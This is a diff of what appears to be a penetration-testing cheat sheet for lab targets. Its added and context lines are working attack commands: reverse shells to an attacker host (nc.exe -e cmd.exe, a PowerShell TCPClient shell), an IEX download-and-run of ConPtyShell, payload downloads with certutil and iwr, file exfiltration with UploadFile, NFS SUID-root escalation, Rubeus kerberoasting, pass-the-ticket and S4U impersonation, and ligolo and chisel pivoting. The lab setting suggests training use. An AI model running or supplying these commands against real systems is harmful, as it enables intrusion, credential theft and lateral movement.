@@ -104,28 +104,29 @@ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetSt
 
 ### Stabilize a Linux TTY (do this immediately)
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # target — or: script -qc /bin/bash /dev/null
 # then:
 export TERM=xterm
-# background w/ Ctrl+Z, then on YOUR box:
+# Ctrl+Z backgrounds it
+# kali
 stty raw -echo; fg
 # (press Enter twice). Now you have arrows, tab, Ctrl+C.
 # size it right:
-stty size            # on your box -> get rows/cols
-stty rows 50 cols 200   # in the shell
+stty size            # note rows/cols
+stty rows 50 cols 200   # target
 ```
 
 ### Fully-interactive Windows shell (ConPtyShell — the Windows `stty` trick)
 Upgrade a dumb Windows shell to a real PTY (tab, history, working Ctrl-C):
 ```bash
-# On your box: raw the terminal so keystrokes pass through, note your size, then listen
+# kali — raw terminal, note size, then listen
 stty raw -echo; (stty size)          # -> e.g. 50 200
 nc -lvnp 443
 ```
 ```powershell
-# On target (from the initial dumb shell):
+# target — from the dumb shell
 IEX(IWR http://LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST 443 200 50
-# reset your terminal afterwards:  stty sane / reset
+# kali afterwards: stty sane   (or: reset)
 ```
 
 ### msfvenom payloads (NOT counted as Metasploit usage)
@@ -164,6 +165,7 @@ certutil -urlcache -split -f http://LHOST/file.exe file.exe
 powershell -c "iwr http://LHOST/file.exe -OutFile file.exe"
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/f.exe','f.exe')"
 copy \\LHOST\share\file.exe .        # from impacket-smbserver
+\\LHOST\share\nc.exe -e cmd.exe LHOST 443   # or run it straight off the share (no disk write)
 # exfil a file from Windows back to you:
 powershell -c "(New-Object Net.WebClient).UploadFile('http://LHOST/up','f')"   # need a receiver
 # or read it over SMB share you host (target writes to \\LHOST\share\)
@@ -569,10 +571,11 @@ Binary or script (SUID/cron/sudo) calls e.g. `service`/`ps`/`cat` without full p
 
 ### NFS no_root_squash (Slonik-adjacent)
 ```bash
-# On YOUR box (as root), mount the export, drop a SUID root binary:
+# kali (as root) — mount the export, drop a SUID-root bash
 mkdir /mnt/x; mount -o rw,vers=3 $IP:/export /mnt/x
 cp /bin/bash /mnt/x/rootbash; chmod +s /mnt/x/rootbash
-# On target: /export/rootbash -p   -> root
+# target
+/export/rootbash -p        # -> root
 ```
 
 ### Writable /etc/passwd or /etc/shadow
@@ -674,7 +677,7 @@ ipconfig /all; route print; netstat -ano        # internal -> pivot
 cmdkey /list                     # stored creds -> runas /savecred
 ```
 ```bash
-# from your box, map patch level to exploits
+# kali — map patch level to exploits
 python wesng.py systeminfo.txt
 ```
 
@@ -824,7 +827,9 @@ nxc smb $IP -u user -p pass --rid-brute            # enumerate all users
 nxc ldap $IP -u user -p pass --bloodhound -c all --dns-server $IP
 # BloodHound collection
 bloodhound-python -u user -p pass -d target.htb -ns $IP -c all --zip
-# or on Windows target: .\SharpHound.exe -c All
+# web01 (domain-joined) — SharpHound zips by default; copy the .zip back to kali:
+.\SharpHound.exe -c All --zipfilename loot           # -> <timestamp>_loot.zip
+.\SharpHound.exe -c All --loop --loopduration 00:10:00   # spread collection out (quieter)
 # LDAP dumps
 ldapdomaindump -u 'target\user' -p pass $IP
 # PowerView (on a Windows shell)
@@ -894,6 +899,19 @@ evil-winrm -i $IP -u user -H NThash                 # if WinRM open
 impacket-getTGT target.htb/user -hashes :NThash ; export KRB5CCNAME=user.ccache
 impacket-psexec -k -no-pass target.htb/user@dc01.target.htb
 ```
+
+### Rubeus (from a Windows shell — roasting, tickets, PtT)
+```powershell
+# web01 (domain-joined shell)
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+.\Rubeus.exe kerberoast /outfile:kerb.txt              # add /tgtdeleg to roast with the current TGT
+.\Rubeus.exe asktgt /user:svc /rc4:<NThash> /ptt       # overpass-the-hash -> inject a TGT
+.\Rubeus.exe asktgt /user:svc /aes256:<key> /ptt       # AES variant if RC4 is disabled
+.\Rubeus.exe ptt /ticket:<base64|kirbi>                # pass-the-ticket (inject a stolen ticket)
+.\Rubeus.exe s4u /user:svc$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target /ptt
+.\Rubeus.exe triage                                    # list tickets in memory  (dump /nowrap to extract)
+```
+Crack the roast output on kali with the hashcat modes in the password file (13100 / 18200).
 
 ### To Domain Admin / DC
 ```bash
@@ -1026,14 +1044,14 @@ Focus drills: AS-REP roast, Kerberoast, password spray, ACL abuse (ForceChangePa
 
 ### ligolo-ng (recommended — clean, fast, full subnet access)
 ```bash
-# On YOUR box (proxy/server):
+# kali (proxy)
 sudo ip tuntap add user $USER mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert                 # starts listener on :11601
 # add route to target internal subnet (do AFTER agent connects, in ligolo console):
-#   session -> select agent -> then on your box:
+#   session -> select agent, then back on kali:
 sudo ip route add 10.10.20.0/24 dev ligolo
-# On the FOOTHOLD host (agent):
+# web01 (foothold — run the agent)
 ./agent -connect LHOST:11601 -ignore-cert
 # In ligolo console: session ; start    -> now reach 10.10.20.0/24 directly with ANY tool
 # Expose a local listener to the agent network (for reverse shells back): 
@@ -1042,11 +1060,11 @@ sudo ip route add 10.10.20.0/24 dev ligolo
 
 ### chisel (SOCKS proxy via HTTP — Dante pattern)
 ```bash
-# Your box (server):
+# kali (server)
 ./chisel server -p 8000 --reverse
-# Foothold (client) -> reverse SOCKS5:
+# web01 (foothold — reverse SOCKS5 back to kali)
 ./chisel client LHOST:8000 R:1080:socks
-# Then proxychains everything:
+# kali — proxychains everything:
 #   /etc/proxychains4.conf -> socks5 127.0.0.1 1080
 proxychains nxc smb 10.10.20.0/24 -u user -p pass
 proxychains nmap -sT -Pn 10.10.20.5
@@ -1056,8 +1074,8 @@ proxychains nmap -sT -Pn 10.10.20.5
 
 ### SSH tunneling (when you have SSH creds/keys)
 ```bash
-ssh -L 8080:127.0.0.1:8080 user@$IP        # local: hit target's internal :8080 on your 8080
-ssh -R 9001:127.0.0.1:9001 user@$IP        # remote: expose your service to target
+ssh -L 8080:127.0.0.1:8080 user@$IP        # kali (tunnels run here) — local fwd: SSH host :8080 -> kali:8080
+ssh -R 9001:127.0.0.1:9001 user@$IP        # remote fwd: a kali service reachable from the target
 ssh -D 1080 user@$IP                       # dynamic SOCKS -> proxychains
 ssh -fN -L ...                             # background, no shell
 # Reach a 3rd host through the SSH host:
@@ -1066,12 +1084,13 @@ ssh -L 3389:10.10.20.5:3389 user@$IP
 
 ### sshuttle (VPN-like, no proxychains needed)
 ```bash
+# kali
 sshuttle -r user@$IP 10.10.20.0/24 --ssh-cmd "ssh -i key"
 ```
 
 ### Windows pivot
 ```cmd
-# No nmap on the pivot host? scan from PowerShell (LOLBin):
+# web01 (pivot) — no nmap here, scan from PowerShell (LOLBin):
 powershell -c "1..1024 | % { if((New-Object Net.Sockets.TcpClient).ConnectAsync('10.10.20.5',$_).Wait(200)){\"$_ open\"} }"
 Test-NetConnection -Port 445 10.10.20.5
 # plink (CLI PuTTY) reverse tunnel when no OpenSSH:
